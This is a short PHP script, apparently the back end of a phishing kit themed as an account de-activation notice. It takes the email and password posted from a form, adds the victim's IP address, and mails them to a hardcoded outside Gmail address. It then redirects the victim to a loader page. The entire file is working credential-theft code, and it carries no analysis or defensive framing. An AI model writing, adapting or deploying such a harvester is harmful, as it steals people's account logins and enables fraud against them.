<?
                                                                                                                                                              

          

                                                            
$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "Email-ID : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------AL-CAPONE-----------\n";
$send = "okocha.darlington86@gmail.com";
$subject = "--New Log $ip -- Source:(Account De-activation)";


mail($send,$subject,$message,$headers);


$redirect = "loader.html";

header("Location: " . $redirect);
 
?>